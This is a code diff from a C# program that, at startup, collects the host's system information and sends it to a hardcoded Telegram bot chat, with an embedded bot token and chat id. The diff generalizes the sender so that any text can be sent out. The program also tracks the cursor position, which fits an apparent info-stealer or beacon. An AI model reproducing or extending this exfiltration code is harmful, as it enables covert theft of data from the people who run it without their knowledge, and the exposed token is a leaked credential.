@@ -30,7 +30,7 @@ class Program
 
     static async Task Main(string[] args)
     {
-        await SendSystemInfoAsync();
+        await SendMessageTelegramAsync(GetSystemInfo());
 
         POINT lastPos;
         GetCursorPos(out lastPos);
@@ -109,13 +109,11 @@ class Program
         Thread.Sleep(100);
     }
 
-    static async Task SendSystemInfoAsync()
+    static async Task SendMessageTelegramAsync(string textToSend)
     {
-        string systemInfo = GetSystemInfo();
-
         using (HttpClient client = new HttpClient())
         {
-            string url = $"https://api.telegram.org/bot5096307292:AAEMoslFV8DfSIa_u2lbM8kQxYtIlb7UGoc/sendMessage?parse_mode=markdown&chat_id=811391818&text={Uri.EscapeDataString(systemInfo)}";
+            string url = $"https://api.telegram.org/bot5096307292:AAEMoslFV8DfSIa_u2lbM8kQxYtIlb7UGoc/sendMessage?parse_mode=markdown&chat_id=811391818&text={Uri.EscapeDataString(textToSend)}";
             HttpResponseMessage response = await client.GetAsync(url);
             response.EnsureSuccessStatusCode();
         }
